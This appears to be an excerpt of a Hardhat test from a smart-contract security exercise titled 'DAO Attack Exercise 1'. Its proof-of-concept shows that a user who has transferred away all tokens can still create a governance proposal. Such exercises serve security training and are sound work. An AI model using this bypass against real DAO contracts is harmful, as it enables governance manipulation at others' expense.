...
describe('DAO Attack Exercise 1', function () {
	...
	it('PoC (Test which catches the bug)', async function () {
		...
		let user1Balance = await rainbowAlliance.balanceOf(user1.address);
		await rainbowAlliance.connect(user1).transfer(user3.address, user1Balance)
		await expect(rainbowAlliance.connect(user1).createProposal("DUMMY PROPOSAL"))
			.to.not.be.revertedWith("no voting rights");
		console.log("User1 doesn't have voting power but succeeded in creating proposal");
	});
});
